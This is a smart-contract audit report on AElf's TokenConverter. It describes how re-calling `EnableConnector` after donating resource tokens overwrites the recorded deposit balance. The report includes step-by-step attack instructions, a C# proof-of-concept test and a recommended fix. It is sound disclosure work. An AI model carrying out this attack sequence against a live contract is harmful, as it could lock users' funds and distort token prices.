# Audit Report

## Title
TokenConverter Deposit Balance Manipulation via EnableConnector Re-enabling Without Protection

## Summary
The `EnableConnector` function in the TokenConverter contract lacks protection against re-invocation on already-enabled connectors and uses a SET operation to overwrite `State.DepositBalance`, allowing attackers to corrupt accumulated deposit balances by donating resource tokens before calling EnableConnector, breaking the Bancor reserve ratio and causing fund locking and price manipulation.

## Finding Description

The TokenConverter contract implements asymmetric balance tracking where resource connectors use real MultiToken balances while deposit connectors use internal `State.DepositBalance` accounting. [1](#0-0) 

When connectors are added via `AddPairConnector`, deposit connectors are configured with `IsDepositAccount = true`. [2](#0-1) 

The critical vulnerability exists in `EnableConnector` which lacks protection against multiple invocations. Unlike `UpdateConnector` which explicitly checks for already-activated connectors, EnableConnector has no such check. [3](#0-2) 

The vulnerable `EnableConnector` function uses a SET operation (=) to establish deposit balance, overwriting any accumulated value. [4](#0-3) 

The `GetNeededDeposit` calculation queries the real token balance which can be artificially inflated through direct transfers. [5](#0-4) 

**Attack Sequence:**

1. Initial state: After legitimate `Buy` operations, `State.DepositBalance["(NT)CPU"]` = 1,000,000 ELF (accumulated via the ADD operation). [6](#0-5) 

2. Attacker donates 500,000 CPU tokens directly to TokenConverter contract via `MultiToken.Transfer`

3. Attacker calls `EnableConnector(TokenSymbol = "CPU", AmountToTokenConvert = 0)`

4. `GetNeededDeposit` calculates: `amountOutOfTokenConvert = TotalSupply - (originalBalance + 500,000) - 0`, resulting in a much smaller value

5. The SET operation at line 297 executes: `State.DepositBalance["(NT)CPU"] = small_value` (overwrites the 1,000,000!)

6. Lines 298-299 set `IsPurchaseEnabled = true` (no-op since already true)

The difference between actual and recorded balance becomes permanently inaccessible because `GetSelfBalance` for deposit connectors returns only `State.DepositBalance`. [1](#0-0) 

## Impact Explanation

**High Severity** - This vulnerability causes multiple critical impacts:

1. **Fund Locking**: The difference between actual balance and recorded balance becomes permanently locked in the contract. While the ELF physically exists in the contract, `GetSelfBalance` for deposit connectors returns only `State.DepositBalance`, making the excess inaccessible.

2. **Price Manipulation**: The Bancor formula uses the corrupted `State.DepositBalance` value, causing severe price distortion. Resource tokens become artificially cheap, allowing exploitation through arbitrage.

3. **DoS on Sell Operations**: Once users sell enough tokens to exhaust the manipulated balance, subsequent `Sell` operations will fail when `State.DepositBalance.Sub()` attempts to go below zero, triggering SafeMath underflow protection. [7](#0-6) 

4. **Protocol Insolvency**: The contract's accounting becomes permanently inconsistent with actual holdings, breaking fundamental invariants of the Bancor model where reserves must accurately reflect the pricing curve.

## Likelihood Explanation

**High Likelihood** - The attack is highly feasible:

- **No Authorization Required**: `EnableConnector` is a public function with no access control beyond the standard token transfer requirements
- **Simple Attack**: Only requires two transactions: (1) Transfer tokens to contract, (2) Call EnableConnector  
- **Low Barrier**: Attacker needs capital for resource token donation, but economic benefit typically outweighs cost for high-value token pairs
- **No Detection**: Direct token transfers are indistinguishable from legitimate operations
- **Realistic Preconditions**: Only requires that connectors exist and have been previously enabled (common state after initialization)
- **Repeatable**: Can be executed multiple times if attacker has sufficient tokens

## Recommendation

Add a re-invocation protection check in `EnableConnector` similar to the one in `UpdateConnector`:

```csharp
public override Empty EnableConnector(ToBeConnectedTokenInfo input)
{
    var fromConnector = State.Connectors[input.TokenSymbol];
    Assert(fromConnector != null && !fromConnector.IsDepositAccount,
        "[EnableConnector]Can't find from connector.");
    var toConnector = State.Connectors[fromConnector.RelatedSymbol];
    Assert(toConnector != null, "[EnableConnector]Can't find to connector.");
    
    // ADD THIS CHECK:
    Assert(!toConnector.IsPurchaseEnabled && !fromConnector.IsPurchaseEnabled, 
        "Connectors have already been enabled");
    
    var needDeposit = GetNeededDeposit(input);
    // ... rest of the function
```

This ensures `EnableConnector` can only be called once during initialization, preventing the SET operation from overwriting accumulated deposit balances.

## Proof of Concept

```csharp
[Fact]
public async Task EnableConnector_Reenabling_Overwrites_DepositBalance()
{
    // Setup: Initialize converter and enable connector
    await DefaultStub.Initialize.SendAsync(new InitializeInput { FeeRate = "0.005" });
    var tokenSymbol = "CPU";
    await CreateTokenAsync(tokenSymbol);
    await AddPairConnectorAsync(tokenSymbol);
    await TokenContractStub.Issue.SendAsync(new IssueInput
    {
        Amount = 1_000_000,
        To = DefaultSender,
        Symbol = tokenSymbol
    });
    
    // First enable - legitimate
    await DefaultStub.EnableConnector.SendAsync(new ToBeConnectedTokenInfo
    {
        TokenSymbol = tokenSymbol,
        AmountToTokenConvert = 1_000_000
    });
    
    // Simulate Buy operations that accumulate DepositBalance
    await DefaultStub.Buy.SendAsync(new BuyInput { Symbol = tokenSymbol, Amount = 50_000 });
    
    // Get deposit balance after Buy (should be > 0)
    var depositConnectorSymbol = "(NT)" + tokenSymbol;
    var balanceBefore = await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol });
    
    // Attack: Donate tokens then re-enable connector
    await TokenContractStub.Transfer.SendAsync(new TransferInput
    {
        To = TokenConverterContractAddress,
        Symbol = tokenSymbol,
        Amount = 500_000
    });
    
    // Re-enable connector (should fail but doesn't due to missing check)
    await DefaultStub.EnableConnector.SendAsync(new ToBeConnectedTokenInfo
    {
        TokenSymbol = tokenSymbol,
        AmountToTokenConvert = 0
    });
    
    var balanceAfter = await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol });
    
    // Vulnerability: DepositBalance was overwritten to a smaller value
    balanceAfter.Value.ShouldBeLessThan(balanceBefore.Value);
}
```

### Citations

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L58-76)
```csharp
    public override Empty UpdateConnector(Connector input)
    {
        AssertPerformedByConnectorController();
        Assert(!string.IsNullOrEmpty(input.Symbol), "input symbol can not be empty'");
        var targetConnector = State.Connectors[input.Symbol];
        Assert(targetConnector != null, "Can not find target connector.");
        Assert(!targetConnector.IsPurchaseEnabled, "connector can not be updated because it has been activated");
        if (!string.IsNullOrEmpty(input.Weight))
        {
            var weight = AssertedDecimal(input.Weight);
            Assert(IsBetweenZeroAndOne(weight), "Connector Shares has to be a decimal between 0 and 1.");
            targetConnector.Weight = input.Weight.ToString(CultureInfo.InvariantCulture);
        }

        if (targetConnector.IsDepositAccount && input.VirtualBalance > 0)
            targetConnector.VirtualBalance = input.VirtualBalance;
        State.Connectors[input.Symbol] = targetConnector;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L79-109)
```csharp
    public override Empty AddPairConnector(PairConnectorParam input)
    {
        AssertPerformedByConnectorController();
        Assert(!string.IsNullOrEmpty(input.ResourceConnectorSymbol),
            "resource token symbol should not be empty");
        var nativeConnectorSymbol = NewNtTokenPrefix.Append(input.ResourceConnectorSymbol);
        Assert(State.Connectors[input.ResourceConnectorSymbol] == null,
            "resource token symbol has existed");
        var resourceConnector = new Connector
        {
            Symbol = input.ResourceConnectorSymbol,
            IsPurchaseEnabled = false,
            RelatedSymbol = nativeConnectorSymbol,
            Weight = input.ResourceWeight
        };
        Assert(IsValidSymbol(resourceConnector.Symbol), "Invalid symbol.");
        AssertValidConnectorWeight(resourceConnector);
        var nativeTokenToResourceConnector = new Connector
        {
            Symbol = nativeConnectorSymbol,
            VirtualBalance = input.NativeVirtualBalance,
            IsVirtualBalanceEnabled = true,
            IsPurchaseEnabled = false,
            RelatedSymbol = input.ResourceConnectorSymbol,
            Weight = input.NativeWeight,
            IsDepositAccount = true
        };
        AssertValidConnectorWeight(nativeTokenToResourceConnector);
        State.Connectors[resourceConnector.Symbol] = resourceConnector;
        State.Connectors[nativeTokenToResourceConnector.Symbol] = nativeTokenToResourceConnector;
        return new Empty();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L132-150)
```csharp
        // Transfer base token
        State.TokenContract.TransferFrom.Send(
            new TransferFromInput
            {
                Symbol = State.BaseTokenSymbol.Value,
                From = Context.Sender,
                To = Context.Self,
                Amount = amountToPay
            });
        State.DepositBalance[fromConnector.Symbol] = State.DepositBalance[fromConnector.Symbol].Add(amountToPay);
        // Transfer bought token
        State.TokenContract.Transfer.Send(
            new TransferInput
            {
                Symbol = input.Symbol,
                To = Context.Sender,
                Amount = input.Amount
            });

```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L185-204)
```csharp
        // Transfer base token
        State.TokenContract.Transfer.Send(
            new TransferInput
            {
                Symbol = State.BaseTokenSymbol.Value,
                To = Context.Sender,
                Amount = amountToReceive
            });
        State.DepositBalance[toConnector.Symbol] =
            State.DepositBalance[toConnector.Symbol].Sub(amountToReceive);
        // Transfer sold token
        State.TokenContract.TransferFrom.Send(
            new TransferFromInput
            {
                Symbol = input.Symbol,
                From = Context.Sender,
                To = Context.Self,
                Amount = input.Amount
            });
        Context.Fire(new TokenSold
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L269-301)
```csharp
    public override Empty EnableConnector(ToBeConnectedTokenInfo input)
    {
        var fromConnector = State.Connectors[input.TokenSymbol];
        Assert(fromConnector != null && !fromConnector.IsDepositAccount,
            "[EnableConnector]Can't find from connector.");
        var toConnector = State.Connectors[fromConnector.RelatedSymbol];
        Assert(toConnector != null, "[EnableConnector]Can't find to connector.");
        var needDeposit = GetNeededDeposit(input);
        if (needDeposit.NeedAmount > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = State.BaseTokenSymbol.Value,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = needDeposit.NeedAmount
                });

        if (input.AmountToTokenConvert > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = input.TokenSymbol,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = input.AmountToTokenConvert
                });

        State.DepositBalance[toConnector.Symbol] = needDeposit.NeedAmount;
        toConnector.IsPurchaseEnabled = true;
        fromConnector.IsPurchaseEnabled = true;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L374-390)
```csharp
    private long GetSelfBalance(Connector connector)
    {
        long realBalance;
        if (connector.IsDepositAccount)
            realBalance = State.DepositBalance[connector.Symbol];
        else
            realBalance = State.TokenContract.GetBalance.Call(
                new GetBalanceInput
                {
                    Owner = Context.Self,
                    Symbol = connector.Symbol
                }).Balance;

        if (connector.IsVirtualBalanceEnabled) return connector.VirtualBalance.Add(realBalance);

        return realBalance;
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConvert_Views.cs (L56-91)
```csharp
    public override DepositInfo GetNeededDeposit(ToBeConnectedTokenInfo input)
    {
        var toConnector = State.Connectors[input.TokenSymbol];
        Assert(toConnector != null && !toConnector.IsDepositAccount, "[GetNeededDeposit]Can't find to connector.");
        var fromConnector = State.Connectors[toConnector.RelatedSymbol];
        Assert(fromConnector != null, "[GetNeededDeposit]Can't find from connector.");
        var tokenInfo = State.TokenContract.GetTokenInfo.Call(
            new GetTokenInfoInput
            {
                Symbol = input.TokenSymbol
            });
        var balance = State.TokenContract.GetBalance.Call(
            new GetBalanceInput
            {
                Owner = Context.Self,
                Symbol = input.TokenSymbol
            }).Balance;
        var amountOutOfTokenConvert = tokenInfo.TotalSupply - balance - input.AmountToTokenConvert;
        long needDeposit = 0;
        if (amountOutOfTokenConvert > 0)
        {
            var fb = fromConnector.VirtualBalance;
            var tb = toConnector.IsVirtualBalanceEnabled
                ? toConnector.VirtualBalance.Add(tokenInfo.TotalSupply)
                : tokenInfo.TotalSupply;
            needDeposit =
                BancorHelper.GetAmountToPayFromReturn(fb, GetWeight(fromConnector),
                    tb, GetWeight(toConnector), amountOutOfTokenConvert);
        }

        return new DepositInfo
        {
            NeedAmount = needDeposit,
            AmountOutOfTokenConvert = amountOutOfTokenConvert
        };
    }
```
